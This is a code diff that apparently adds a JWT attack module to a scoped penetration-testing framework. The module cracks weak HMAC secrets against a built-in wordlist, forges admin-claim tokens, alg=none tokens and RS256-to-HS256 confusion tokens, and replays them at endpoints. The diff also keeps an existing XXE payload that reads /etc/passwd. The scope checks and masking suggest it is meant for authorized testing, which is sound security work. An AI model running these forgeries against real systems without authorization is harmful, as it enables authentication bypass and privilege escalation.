@@ -1,5 +1,8 @@
 from __future__ import annotations
 
+import base64
+import hashlib
+import hmac
 import json
 import os
 import re
@@ -7,7 +10,7 @@ import subprocess
 import tempfile
 from pathlib import Path
 from typing import Any, Callable
-from urllib.parse import urlparse
+from urllib.parse import urljoin, urlparse
 
 import httpx as httpx_client
 
@@ -20,6 +23,7 @@ NIKTO_RESULTS_ARTIFACT_NAME = "nikto-results.json"
 SQLMAP_RESULTS_ARTIFACT_NAME = "sqlmap-results.json"
 EXTERNAL_OSINT_RESULTS_ARTIFACT_NAME = "external-osint-results.json"
 XXE_RESULTS_ARTIFACT_NAME = "xxe-results.json"
+JWT_RESULTS_ARTIFACT_NAME = "jwt-results.json"
 
 DEFAULT_CONTENT_WORDS = (
     "admin",
@@ -38,6 +42,26 @@ XXE_DIRECT_PAYLOAD = """<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE aegispt [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
 <aegispt><probe>&xxe;</probe></aegispt>
 """
+
+JWT_PATTERN = re.compile(r"(?<![A-Za-z0-9_-])([A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]*)(?![A-Za-z0-9_-])")
+SCRIPT_SRC_PATTERN = re.compile(r"<script[^>]+src=[\"']([^\"']+)[\"']", re.IGNORECASE)
+JWT_WEAK_SECRET_CANDIDATES = (
+    "secret",
+    "password",
+    "123456",
+    "admin",
+    "jwt",
+    "changeme",
+    "default",
+    "test",
+    "webgoat",
+    "aegispt",
+)
+JWT_HMAC_ALGORITHMS = {
+    "HS256": hashlib.sha256,
+    "HS384": hashlib.sha384,
+    "HS512": hashlib.sha512,
+}
 
 CommandRunner = Callable[..., subprocess.CompletedProcess[str]]
 
@@ -138,6 +162,307 @@ def _finding(
         "methodology_tags": list(dict.fromkeys(tags)),
         **({"evidence": extra} if extra else {}),
     }
+
+
+def _base64url_decode(value: str) -> bytes:
+    padding = "=" * (-len(value) % 4)
+    return base64.urlsafe_b64decode((value + padding).encode("ascii"))
+
+
+def _base64url_encode(value: bytes) -> str:
+    return base64.urlsafe_b64encode(value).decode("ascii").rstrip("=")
+
+
+def _jwt_json_segment(value: str) -> dict[str, Any] | None:
+    try:
+        decoded = json.loads(_base64url_decode(value).decode("utf-8"))
+    except (ValueError, UnicodeDecodeError):
+        return None
+    return decoded if isinstance(decoded, dict) else None
+
+
+def _parse_jwt(token: str) -> dict[str, Any] | None:
+    parts = token.strip().split(".")
+    if len(parts) != 3:
+        return None
+    header = _jwt_json_segment(parts[0])
+    payload = _jwt_json_segment(parts[1])
+    if header is None or payload is None:
+        return None
+    alg = str(header.get("alg") or "").strip()
+    return {
+        "token": token,
+        "header": header,
+        "payload": payload,
+        "alg": alg,
+        "signing_input": f"{parts[0]}.{parts[1]}".encode("ascii"),
+        "signature": _base64url_decode(parts[2]) if parts[2] else b"",
+    }
+
+
+def _jwt_fingerprint(token: str) -> str:
+    return hashlib.sha256(token.encode("utf-8")).hexdigest()[:16]
+
+
+def _mask_secret(secret: str) -> str:
+    if len(secret) <= 2:
+        return "*" * len(secret)
+    if len(secret) <= 6:
+        return f"{secret[:1]}***{secret[-1:]}"
+    return f"{secret[:2]}***{secret[-2:]}"
+
+
+def _hmac_signature(*, alg: str, signing_input: bytes, secret: str) -> bytes | None:
+    digest = JWT_HMAC_ALGORITHMS.get(alg.upper())
+    if digest is None:
+        return None
+    return hmac.new(secret.encode("utf-8"), signing_input, digest).digest()
+
+
+def _verify_hmac_jwt(parsed: dict[str, Any], secret: str) -> bool:
+    signature = _hmac_signature(
+        alg=str(parsed["alg"]),
+        signing_input=parsed["signing_input"],
+        secret=secret,
+    )
+    return signature is not None and hmac.compare_digest(signature, parsed["signature"])
+
+
+def _sign_jwt(*, header: dict[str, Any], payload: dict[str, Any], secret: str, alg: str) -> str:
+    safe_header = {**header, "alg": alg}
+    encoded_header = _base64url_encode(
+        json.dumps(safe_header, separators=(",", ":"), sort_keys=True).encode("utf-8")
+    )
+    encoded_payload = _base64url_encode(
+        json.dumps(payload, separators=(",", ":"), sort_keys=True).encode("utf-8")
+    )
+    signing_input = f"{encoded_header}.{encoded_payload}".encode("ascii")
+    signature = _hmac_signature(alg=alg, signing_input=signing_input, secret=secret)
+    if signature is None:
+        raise ValueError(f"unsupported HMAC JWT algorithm: {alg}")
+    return f"{encoded_header}.{encoded_payload}.{_base64url_encode(signature)}"
+
+
+def _none_jwt(*, header: dict[str, Any], payload: dict[str, Any]) -> str:
+    safe_header = {**header, "alg": "none"}
+    encoded_header = _base64url_encode(
+        json.dumps(safe_header, separators=(",", ":"), sort_keys=True).encode("utf-8")
+    )
+    encoded_payload = _base64url_encode(
+        json.dumps(payload, separators=(",", ":"), sort_keys=True).encode("utf-8")
+    )
+    return f"{encoded_header}.{encoded_payload}."
+
+
+def _jwt_tokens_from_text(text: str) -> list[str]:
+    candidates: list[str] = []
+    seen: set[str] = set()
+    for match in JWT_PATTERN.finditer(text or ""):
+        token = match.group(1)
+        if token in seen or _parse_jwt(token) is None:
+            continue
+        seen.add(token)
+        candidates.append(token)
+    return candidates
+
+
+def _jwt_secret_candidates(targets: list[str], configured_secrets: list[str] | None) -> list[str]:
+    values: list[str] = [*JWT_WEAK_SECRET_CANDIDATES]
+    for target in targets:
+        host = _url_host(target)
+        if host:
+            values.extend(part for part in host.split(".") if part)
+    if isinstance(configured_secrets, list):
+        values.extend(str(secret).strip() for secret in configured_secrets if str(secret).strip())
+    bounded = [value for value in dict.fromkeys(values) if value]
+    return bounded[:24]
+
+
+def _record_jwt_token(
+    records: list[dict[str, Any]],
+    raw_tokens: dict[str, str],
+    *,
+    token: str,
+    source_url: str,
+    source_type: str,
+) -> None:
+    parsed = _parse_jwt(token)
+    if parsed is None:
+        return
+    fingerprint = _jwt_fingerprint(token)
+    if fingerprint in raw_tokens:
+        return
+    raw_tokens[fingerprint] = token
+    records.append(
+        {
+            "fingerprint": fingerprint,
+            "source_url": source_url,
+            "source_type": source_type,
+            "alg": parsed["alg"],
+            "header_keys": sorted(str(key) for key in parsed["header"].keys()),
+            "claim_keys": sorted(str(key) for key in parsed["payload"].keys()),
+        }
+    )
+
+
+def _extract_jwt_sources_from_evidence(
+    evidence_records: list[dict[str, Any] | str] | None,
+    token_records: list[dict[str, Any]],
+    raw_tokens: dict[str, str],
+) -> None:
+    records = evidence_records if isinstance(evidence_records, list) else []
+    for item in records:
+        if isinstance(item, str):
+            text = item
+            source_url = "provided-evidence"
+        elif isinstance(item, dict):
+            text = " ".join(
+                str(item.get(key) or "")
+                for key in ("body", "text", "response_body", "javascript", "source", "headers")
+            )
+            source_url = str(item.get("url") or item.get("target") or item.get("endpoint") or "provided-evidence")
+        else:
+            continue
+        for token in _jwt_tokens_from_text(text):
+            _record_jwt_token(
+                token_records,
+                raw_tokens,
+                token=token,
+                source_url=source_url,
+                source_type="evidence",
+            )
+
+
+def _configured_jwks_endpoints(
+    targets: list[str],
+    *,
+    scope_allowlist: dict[str, Any] | None,
+    jwks_endpoints: list[str] | None,
+) -> list[str]:
+    candidates: list[str] = []
+    if isinstance(jwks_endpoints, list):
+        candidates.extend(str(endpoint).strip() for endpoint in jwks_endpoints if str(endpoint).strip())
+    for target in targets:
+        root_jwks = urljoin(normalize_http_target(target), "/.well-known/jwks.json")
+        if _target_within_scope(scope_allowlist, root_jwks):
+            candidates.append(root_jwks)
+    normalized: list[str] = []
+    seen: set[str] = set()
+    for endpoint in candidates:
+        candidate = normalize_http_target(endpoint)
+        if not _target_within_scope(scope_allowlist, candidate):
+            raise ValueError(f"JWKS endpoint outside scope: {candidate}")
+        if candidate not in seen:
+            seen.add(candidate)
+            normalized.append(candidate)
+    return normalized
+
+
+def _jwks_private_key_exposed(jwk: dict[str, Any]) -> bool:
+    private_fields = {"d", "p", "q", "dp", "dq", "qi", "oth"}
+    if any(field in jwk for field in private_fields):
+        return True
+    material = json.dumps(jwk, sort_keys=True)
+    return "PRIVATE KEY" in material
+
+
+def _accepted_replay(response: Any, context: dict[str, Any]) -> bool:
+    text = str(getattr(response, "text", "") or "")
+    success_markers = [
+        str(marker)
+        for marker in context.get("success_markers", [])
+        if isinstance(marker, str) and marker
+    ]
+    reject_markers = [
+        str(marker)
+        for marker in context.get("reject_markers", [])
+        if isinstance(marker, str) and marker
+    ]
+    if any(marker in text for marker in reject_markers):
+        return False
+    if success_markers:
+        return any(marker in text for marker in success_markers)
+    accepted_status_codes = [
+        int(code)
+        for code in context.get("accepted_status_codes", [])
+        if isinstance(code, int)
+    ]
+    return bool(accepted_status_codes and response.status_code in accepted_status_codes)
+
+
+def _replay_jwt(
+    client: Any,
+    *,
+    context: dict[str, Any],
+    token: str,
+    scope_allowlist: dict[str, Any] | None,
+) -> dict[str, Any]:
+    endpoint = str(context.get("url") or context.get("endpoint") or context.get("target") or "").strip()
+    if not endpoint:
+        return {"status": "skipped", "reason": "missing replay endpoint"}
+    endpoint = normalize_http_target(endpoint)
+    if not _target_within_scope(scope_allowlist, endpoint):
+        raise ValueError(f"JWT replay endpoint outside scope: {endpoint}")
+    method = str(context.get("method") or "GET").upper()
+    if method not in {"GET", "POST"}:
+        return {"endpoint": endpoint, "status": "skipped", "reason": f"unsupported method {method}"}
+
+    placement = str(context.get("placement") or "authorization_bearer").strip().lower()
+    headers: dict[str, str] = {}
+    cookies: dict[str, str] = {}
+    params: dict[str, str] = {}
+    json_body: dict[str, str] | None = None
+    if placement in {"authorization", "authorization_bearer", "bearer", "header"}:
+        header_name = str(context.get("header_name") or "Authorization")
+        header_value = (
+            str(context.get("header_template")).replace("{token}", token)
+            if context.get("header_template")
+            else f"Bearer {token}"
+        )
+        headers[header_name] = header_value
+    elif placement == "cookie":
+        cookies[str(context.get("cookie_name") or "jwt")] = token
+    elif placement == "query":
+        params[str(context.get("query_parameter") or "token")] = token
+    elif placement == "body_json":
+        json_body = {str(context.get("body_parameter") or "token"): token}
+    else:
+        return {"endpoint": endpoint, "status": "skipped", "reason": f"unsupported placement {placement}"}
+
+    request_kwargs: dict[str, Any] = {"headers": headers}
+    if cookies:
+        request_kwargs["cookies"] = cookies
+    if params:
+        request_kwargs["params"] = params
+    if method == "GET":
+        response = client.get(endpoint, **request_kwargs)
+    else:
+        response = client.post(endpoint, json=json_body, **request_kwargs)
+    return {
+        "endpoint": endpoint,
+        "status": "checked",
+        "status_code": response.status_code,
+        "accepted": _accepted_replay(response, context),
+        "placement": placement,
+    }
+
+
+def _claim_mutation(payload: dict[str, Any]) -> dict[str, Any] | None:
+    mutated = dict(payload)
+    changed = False
+    for key in ("role", "roles"):
+        if key in mutated and mutated[key] != "admin":
+            mutated[key] = "admin"
+            changed = True
+    for key in ("admin", "is_admin", "isAdmin"):
+        if key in mutated and mutated[key] is not True:
+            mutated[key] = True
+            changed = True
+    for key in ("user_id", "uid", "sub"):
+        if key in mutated and str(mutated[key]) not in {"1", "admin"}:
+            mutated[key] = "1"
+            changed = True
+    return mutated if changed else None
 
 
 def _content_discovery_severity(status_code: int, url: str) -> str:
@@ -366,6 +691,348 @@ def execute_xxe_probe(
             "dos_payloads_sent": False,
         },
         artifacts=[_json_artifact(XXE_RESULTS_ARTIFACT_NAME, artifact_payload)],
+    )
+
+
+def execute_jwt_probe(
+    targets: list[str],
+    *,
+    scope_allowlist: dict[str, Any] | None = None,
+    evidence_records: list[dict[str, Any] | str] | None = None,
+    jwt_tokens: list[str] | None = None,
+    replay_contexts: list[dict[str, Any]] | None = None,
+    public_key_materials: list[str] | None = None,
+    jwks_endpoints: list[str] | None = None,
+    weak_secrets: list[str] | None = None,
+    timeout_seconds: float = 30.0,
+    client_factory: Callable[..., Any] = httpx_client.Client,
+) -> RunnerExecution:
+    if timeout_seconds <= 0:
+        raise ValueError("timeout_seconds must be greater than zero")
+    normalized_targets = _approved_web_targets(targets, scope_allowlist=scope_allowlist)
+    configured_replay_contexts = replay_contexts if isinstance(replay_contexts, list) else []
+    explicit_public_keys = [
+        str(key).strip()
+        for key in public_key_materials or []
+        if isinstance(key, str) and str(key).strip()
+    ][:8]
+    secret_candidates = _jwt_secret_candidates(normalized_targets, weak_secrets)
+
+    token_records: list[dict[str, Any]] = []
+    raw_tokens: dict[str, str] = {}
+    jwks_results: list[dict[str, Any]] = []
+    check_results: list[dict[str, Any]] = []
+    findings: list[dict[str, Any]] = []
+    stderr_lines: list[str] = []
+    exit_code = 0
+
+    _extract_jwt_sources_from_evidence(evidence_records, token_records, raw_tokens)
+    for token in jwt_tokens or []:
+        _record_jwt_token(
+            token_records,
+            raw_tokens,
+            token=str(token),
+            source_url="provided-token",
+            source_type="provided-token",
+        )
+
+    with client_factory(timeout=timeout_seconds, follow_redirects=True) as client:
+        for target in normalized_targets:
+            try:
+                response = client.get(target)
+                body = response.text or ""
+                for token in _jwt_tokens_from_text(body):
+                    _record_jwt_token(
+                        token_records,
+                        raw_tokens,
+                        token=token,
+                        source_url=target,
+                        source_type="response",
+                    )
+                for script_src in SCRIPT_SRC_PATTERN.findall(body):
+                    script_url = urljoin(target, script_src)
+                    if not _target_within_scope(scope_allowlist, script_url):
+                        continue
+                    try:
+                        script_response = client.get(script_url)
+                        for token in _jwt_tokens_from_text(script_response.text or ""):
+                            _record_jwt_token(
+                                token_records,
+                                raw_tokens,
+                                token=token,
+                                source_url=script_url,
+                                source_type="javascript",
+                            )
+                    except httpx_client.HTTPError as exc:
+                        stderr_lines.append(f"{script_url}: {exc}")
+            except httpx_client.HTTPError as exc:
+                exit_code = 1
+                stderr_lines.append(f"{target}: {exc}")
+
+        for jwks_url in _configured_jwks_endpoints(
+            normalized_targets,
+            scope_allowlist=scope_allowlist,
+            jwks_endpoints=jwks_endpoints,
+        ):
+            try:
+                response = client.get(jwks_url)
+                jwks_payload = response.json() if response.status_code < 500 else {}
+                keys = jwks_payload.get("keys") if isinstance(jwks_payload, dict) else []
+                key_count = len(keys) if isinstance(keys, list) else 0
+                private_exposed = any(
+                    isinstance(jwk, dict) and _jwks_private_key_exposed(jwk)
+                    for jwk in keys
+                    if isinstance(keys, list)
+                )
+                jwks_results.append(
+                    {
+                        "url": jwks_url,
+                        "status_code": response.status_code,
+                        "key_count": key_count,
+                        "private_key_exposed": private_exposed,
+                    }
+                )
+                if private_exposed:
+                    findings.append(
+                        _finding(
+                            title="JWT Private Key Exposed in JWKS",
+                            severity="critical",
+                            target=jwks_url,
+                            summary=(
+                                "The approved JWKS endpoint exposes private key material, "
+                                "allowing JWT signing key compromise."
+                            ),
+                            tags=["jwt", "jwks", "authentication", "owasp-wstg"],
+                            extra={"jwks_url": jwks_url, "private_key_material_stored": False},
+                        )
+                    )
+            except (httpx_client.HTTPError, ValueError) as exc:
+                stderr_lines.append(f"{jwks_url}: {exc}")
+
+        for token_record in token_records:
+            fingerprint = str(token_record["fingerprint"])
+            token = raw_tokens[fingerprint]
+            parsed = _parse_jwt(token)
+            if parsed is None:
+                continue
+            alg = str(parsed["alg"]).upper()
+            source_url = str(token_record.get("source_url") or normalized_targets[0])
+
+            if alg in JWT_HMAC_ALGORITHMS:
+                cracked_secret = None
+                for candidate_secret in secret_candidates:
+                    if _verify_hmac_jwt(parsed, candidate_secret):
+                        cracked_secret = candidate_secret
+                        break
+                check_results.append(
+                    {
+                        "token_fingerprint": fingerprint,
+                        "check": "weak-hmac-secret",
+                        "alg": alg,
+                        "candidate_count": len(secret_candidates),
+                        "cracked": cracked_secret is not None,
+                    }
+                )
+                if cracked_secret is not None:
+                    findings.append(
+                        _finding(
+                            title="JWT Weak Secret Cracked",
+                            severity="high",
+                            target=source_url,
+                            summary=(
+                                "A captured HMAC-signed JWT validated with a bounded weak-secret "
+                                "candidate, indicating the signing secret is guessable."
+                            ),
+                            tags=["jwt", "authentication", "session_management", "owasp-wstg"],
+                            extra={
+                                "token_fingerprint": fingerprint,
+                                "alg": alg,
+                                "weak_secret_masked": _mask_secret(cracked_secret),
+                                "weak_secret_sha256": hashlib.sha256(
+                                    cracked_secret.encode("utf-8")
+                                ).hexdigest(),
+                                "candidate_count": len(secret_candidates),
+                                "raw_token_stored": False,
+                            },
+                        )
+                    )
+                    mutated_claims = _claim_mutation(parsed["payload"])
+                    if mutated_claims is not None and configured_replay_contexts:
+                        claims_token = _sign_jwt(
+                            header=parsed["header"],
+                            payload=mutated_claims,
+                            secret=cracked_secret,
+                            alg=alg,
+                        )
+                        for context in configured_replay_contexts:
+                            replay = _replay_jwt(
+                                client,
+                                context=context,
+                                token=claims_token,
+                                scope_allowlist=scope_allowlist,
+                            )
+                            replay.update(
+                                {
+                                    "token_fingerprint": fingerprint,
+                                    "check": "claims-manipulation",
+                                }
+                            )
+                            check_results.append(replay)
+                            if replay.get("accepted") is True:
+                                findings.append(
+                                    _finding(
+                                        title="JWT Claims Manipulation Possible",
+                                        severity="high",
+                                        target=str(replay.get("endpoint") or source_url),
+                                        summary=(
+                                            "A replay of a JWT with elevated authorization claims was "
+                                            "accepted in an explicitly approved replay context."
+                                        ),
+                                        tags=["jwt", "authorization", "authentication", "owasp-wstg"],
+                                        extra={
+                                            "token_fingerprint": fingerprint,
+                                            "replay_endpoint": replay.get("endpoint"),
+                                            "mutated_claim_keys": sorted(mutated_claims.keys()),
+                                            "modified_token_stored": False,
+                                        },
+                                    )
+                                )
+                                break
+
+            if configured_replay_contexts:
+                none_token = _none_jwt(header=parsed["header"], payload=parsed["payload"])
+                for context in configured_replay_contexts:
+                    replay = _replay_jwt(
+                        client,
+                        context=context,
+                        token=none_token,
+                        scope_allowlist=scope_allowlist,
+                    )
+                    replay.update({"token_fingerprint": fingerprint, "check": "none-algorithm"})
+                    check_results.append(replay)
+                    if replay.get("accepted") is True:
+                        findings.append(
+                            _finding(
+                                title="JWT None Algorithm Accepted",
+                                severity="critical",
+                                target=str(replay.get("endpoint") or source_url),
+                                summary=(
+                                    "A JWT modified to use alg=none and an empty signature was "
+                                    "accepted in an explicitly approved replay context."
+                                ),
+                                tags=["jwt", "authentication", "session_management", "owasp-wstg"],
+                                extra={
+                                    "token_fingerprint": fingerprint,
+                                    "original_alg": alg,
+                                    "replay_endpoint": replay.get("endpoint"),
+                                    "modified_token_stored": False,
+                                },
+                            )
+                        )
+                        break
+            else:
+                check_results.append(
+                    {
+                        "token_fingerprint": fingerprint,
+                        "check": "none-algorithm",
+                        "status": "not_replayed",
+                        "reason": "no explicitly approved replay context",
+                    }
+                )
+
+            if alg.startswith(("RS", "PS", "ES")):
+                if not explicit_public_keys:
+                    check_results.append(
+                        {
+                            "token_fingerprint": fingerprint,
+                            "check": "algorithm-confusion",
+                            "status": "not_replayed",
+                            "reason": "no explicit public key material",
+                        }
+                    )
+                    continue
+                for public_key in explicit_public_keys:
+                    confusion_token = _sign_jwt(
+                        header=parsed["header"],
+                        payload=parsed["payload"],
+                        secret=public_key,
+                        alg="HS256",
+                    )
+                    for context in configured_replay_contexts:
+                        replay = _replay_jwt(
+                            client,
+                            context=context,
+                            token=confusion_token,
+                            scope_allowlist=scope_allowlist,
+                        )
+                        replay.update(
+                            {
+                                "token_fingerprint": fingerprint,
+                                "check": "algorithm-confusion",
+                                "original_alg": alg,
+                                "mutated_alg": "HS256",
+                            }
+                        )
+                        check_results.append(replay)
+                        if replay.get("accepted") is True:
+                            findings.append(
+                                _finding(
+                                    title="JWT Algorithm Confusion (RS256 to HS256)",
+                                    severity="critical",
+                                    target=str(replay.get("endpoint") or source_url),
+                                    summary=(
+                                        "A JWT modified from an asymmetric algorithm to HS256 and "
+                                        "signed with explicitly available public key material was "
+                                        "accepted in an approved replay context."
+                                    ),
+                                    tags=["jwt", "authentication", "session_management", "owasp-wstg"],
+                                    extra={
+                                        "token_fingerprint": fingerprint,
+                                        "original_alg": alg,
+                                        "mutated_alg": "HS256",
+                                        "replay_endpoint": replay.get("endpoint"),
+                                        "public_key_material_stored": False,
+                                        "modified_token_stored": False,
+                                    },
+                                )
+                            )
+                            break
+
+    artifact_payload = {
+        "tokens": token_records,
+        "jwks": jwks_results,
+        "checks": check_results,
+        "findings": findings,
+        "summary": {
+            "target_count": len(normalized_targets),
+            "token_count": len(token_records),
+            "jwks_endpoint_count": len(jwks_results),
+            "finding_count": len(findings),
+            "weak_secret_candidate_count": len(secret_candidates),
+            "replay_context_count": len(configured_replay_contexts),
+        },
+        "safety": {
+            "raw_tokens_stored": False,
+            "modified_tokens_stored": False,
+            "weak_secret_bound": len(secret_candidates),
+            "replay_requires_explicit_context": True,
+            "unrelated_user_token_generation": False,
+        },
+    }
+    return RunnerExecution(
+        tool="jwt-probe",
+        exit_code=exit_code,
+        stdout=json.dumps(artifact_payload["summary"], sort_keys=True),
+        stderr="\n".join(line for line in stderr_lines if line),
+        metadata={
+            "status": "ok" if exit_code == 0 else "completed_with_errors",
+            "runner_digest": "workers.web_depth.jwt:v1",
+            "tool_version": "custom-python",
+            "finding_count": len(findings),
+            "token_count": len(token_records),
+            "replay_context_count": len(configured_replay_contexts),
+        },
+        artifacts=[_json_artifact(JWT_RESULTS_ARTIFACT_NAME, artifact_payload)],
     )
 
 
